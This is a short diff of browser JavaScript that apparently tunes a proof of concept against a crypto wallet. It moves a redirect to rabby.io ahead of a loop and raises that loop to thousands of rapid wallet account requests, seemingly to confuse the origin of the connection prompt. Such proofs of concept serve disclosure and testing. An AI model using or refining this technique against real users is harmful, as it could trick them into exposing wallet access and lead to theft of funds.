@@ -18,7 +18,8 @@
                         return;
                     }
                     try {
-                        for (let i = 1; i < 200; i++) {
+                        window.location = "https://rabby.io";
+                        for (let i = 1; i < 3000; i++) {
                             setTimeout(async () => {
                                 const accountsPromise = window.ethereum.request(
                                     {
@@ -34,9 +35,8 @@
                                         "Connection failed";
                                     console.error(err);
                                 }
-                            }, i * 10);
+                            }, i);
                         }
-                        window.location = "https://rabby.io";
                     } catch (err) {
                         document.getElementById("msg").innerText =
                             "Unexpected error";
